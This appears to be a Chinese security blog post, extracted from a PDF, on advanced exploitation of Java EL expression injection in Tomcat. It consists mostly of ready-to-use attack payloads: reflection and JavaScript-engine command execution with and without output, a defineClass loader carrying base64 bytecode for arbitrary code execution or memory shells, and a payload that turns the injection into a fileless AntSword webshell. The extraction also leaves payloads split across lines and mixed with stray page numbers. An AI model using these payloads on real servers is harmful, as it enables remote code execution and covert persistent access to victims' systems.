1
EL表达式注⼊的进阶利⽤
前⾔
环境搭建
正⽂
⽆回显执⾏命令
有回显执⾏命令
任意代码执⾏
直接连接蚁剑
思路扩展
@yzddMr6 
表达式注⼊是Java安全从业者会经常碰到的⼀类漏洞。Struct2的ognl表达式注⼊，Nexus3的EL表
达式注⼊，前⼀段时间爆出的Spring Cloud gateway的Spel表达式注⼊等等，重要性不需要多说。 
前⼀段时间徐师在Make JDBC Attacks Brilliant Again 番外篇⾥也提到了postgresql+EL表达式来
写⼊Weblogic⼀句话的场景，所以今天想借此机会分享⼀些进阶利⽤的payload。 
Tomcat 8.5+jdk8 
这⾥模拟了⼀个el表达式注⼊的场景 
前⾔ 
环境搭建 
C#
复制代码
1
2
3
4
5
2
可能⼤家最常⻅到的就是执⾏命令的payload，由于el表达式不能执⾏new等操作，所以需要⽤反射来构
造。 
样例如下： 
或者是借助js引擎 
不过两者都是⽆回显的，不优雅。 
最早看到的有回显相关的研究是在这篇⽂章：https://forum.butian.net/share/886，写的⾮常好，最
后的payload如下： 
正⽂ 
⽆回显执⾏命令 
有回显执⾏命令 
C#
复制代码
code=${"".getClass().forName("java.lang.Runtime").getMethod("exec","".get
Class()).invoke("".getClass().forName("java.lang.Runtime").getMethod("get
Runtime").invoke(null),"calc.exe")}
1
C#
复制代码
code=${"".getClass().forName("javax.script.ScriptEngineManager").newInsta
nce().getEngineByName("js").eval("new+java.lang.ProcessBuilder['(java.lan
g.String[])'](['cmd','/c','calc']).start()")}
1
3
由于EL表达式不⽀持直接赋值以及new对象，所以需要⽤到pageContext.getAttribute跟
pageContext.setAttribute来间接实现变量的传递，导致payload写起来⾮常的麻烦，也⾮常的臃肿。 
所以我们换⼀种思路，不再使⽤EL⾃身的语法，⽽是在js引擎中实现我们的逻辑。 
⾃⼰在 ⼀种新型Java⼀句话⽊⻢的实现 ⾥⾯对js引擎的各种语法进⾏了详细的解释：
https://yzddmr6.com/posts/%E4%B8%80%E7%A7%8D%E6%96%B0%E5%9E%8BJava%E4%
B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AE%9E%E7
%8E%B0/ 
经过简化后，我们的payload如下： 
C#
复制代码
${pageContext.setAttribute("inputStream", Runtime.getRuntime().exec("cmd 
/c 
dir").getInputStream());Thread.sleep(1000);pageContext.setAttribute("inpu
tStreamAvailable", 
pageContext.getAttribute("inputStream").available());pageContext.setAttri
bute("byteBufferClass", 
Class.forName("java.nio.ByteBuffer"));pageContext.setAttribute("allocateM
ethod", pageContext.getAttribute("byteBufferClass").getMethod("allocate", 
Integer.TYPE));pageContext.setAttribute("heapByteBuffer", 
pageContext.getAttribute("allocateMethod").invoke(null, 
pageContext.getAttribute("inputStreamAvailable")));pageContext.getAttribu
te("inputStream").read(pageContext.getAttribute("heapByteBuffer").array()
, 0, 
pageContext.getAttribute("inputStreamAvailable"));pageContext.setAttribut
e("byteArrType", 
pageContext.getAttribute("heapByteBuffer").array().getClass());pageContex
t.setAttribute("stringClass", 
Class.forName("java.lang.String"));pageContext.setAttribute("stringConstr
uctor", 
pageContext.getAttribute("stringClass").getConstructor(pageContext.getAtt
ribute("byteArrType")));pageContext.setAttribute("stringRes", 
pageContext.getAttribute("stringConstructor").newInstance(pageContext.get
Attribute("heapByteBuffer").array()));pageContext.getAttribute("stringRes
")}
1
4
以上只是做到了任意命令执⾏，但是在实战中我们更希望得到⼀个任意代码执⾏的⼝⼦。任意命令执⾏
在进程命令⾏层⾯很容易留下痕迹被发现，⽽任意代码执⾏在语⾔函数层⾯有天然的隐蔽的优势，并且
可以实现注⼊内存⻢等进阶操作。 
在这⾥我们同样可以借助js引擎调⽤defineClass来实现任意代码执⾏的操作： 
ant参数内容如下： 
任意代码执⾏ 
C#
复制代码
${"".getClass().forName("javax.script.ScriptEngineManager").newInstance()
.getEngineByName("js").eval("var s = [3];s[0] = \"cmd\";s[1] = 
\"/c\";s[2] = \"whoami\";var p = 
java.lang.Runtime.getRuntime().exec(s);var sc = new 
java.util.Scanner(p.getInputStream(),\"GBK\").useDelimiter(\"\\\\A\");var 
result = sc.hasNext() ? sc.next() : \"\";sc.close();result;")}
1
C#
复制代码
code=${"".getClass().forName("javax.script.ScriptEngineManager").newInsta
nce().getEngineByName("js").eval(pageContext.request.getParameter("ant"))
}
1
5
C#
复制代码
try {
    load("nashorn:mozilla_compat.js");
  } catch (e) {}
  importPackage(Packages.java.util);
  importPackage(Packages.java.lang);
  importPackage(Packages.java.io);
  function Base64DecodeToByte(str) {
    importPackage(Packages.sun.misc);
    importPackage(Packages.java.util);
    var bt;
    try {
      bt = new BASE64Decoder().decodeBuffer(str);
    } catch (e) {
      bt = new Base64().getDecoder().decode(str);
    }
    return bt;
  }
  function define(Classdata, cmd) {
    var classBytes = Base64DecodeToByte(Classdata);
    var byteArray = Java.type("byte[]");
    var int = Java.type("int");
    var defineClassMethod = 
java.lang.ClassLoader.class.getDeclaredMethod(
      "defineClass",
      byteArray.class,
      int.class,
      int.class
    );
    defineClassMethod.setAccessible(true);
    var cc = defineClassMethod.invoke(
      Thread.currentThread().getContextClassLoader(),
      classBytes,
      0,
      classBytes.length
    );
    return cc.getConstructor(java.lang.String.class).newInstance(cmd);
  }  
  define(
 "yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKEx
qYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFy
aWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7A
QADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEACl
NvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXh
jZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJp
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
6
其中字节码部分可以换为注⼊内存⻢的payload。 
⽤defineClass还是每次要编译，如果能直接⽤WebShell管理⼯具就好了。 
这时候本⼈写的js引擎的⼀句话就可以排上⽤场了。由于这种类型的使⽤需要内置request跟response
两个对象，所以我们需要先把他绑定到eval的上下⽂中，具体代码如下： 
直接连接蚁剑 
bmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhb
mcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2
Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAA
AFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJ
AA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAA
BMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIAGA==",
      "calc"
    );
39
40
C#
复制代码
${pageContext.setAttribute("engine","".getClass().forName("javax.script.S
criptEngineManager").newInstance().getEngineByName("js"));pageContext.get
Attribute("engine").put("request",pageContext.request);pageContext.getAtt
ribute("engine").put("response",pageContext.response);pageContext.getAttr
ibute("engine").eval(pageContext.request.getParameter("ant"))}
1
7
其中code参数是el表达式的payload，蚁剑的payload是通过ant参数传⼊的。所以需要在请求信息中添
加code参数 
测试连接成功 
8
9
⾄此我们已经实现了从EL表达式注⼊到WebShell的⽆⽂件利⽤了，后续可以配合As-Exploits插件等来
实现更强⼤的后渗透操作。 
其实完全还可以⽤URLClassLoader或者JNDI注⼊等去远程加载我们的任意代码，但是这样做还是需要
出⽹等条件，⽐较麻烦，本⽂就不再延伸了。 
思路扩展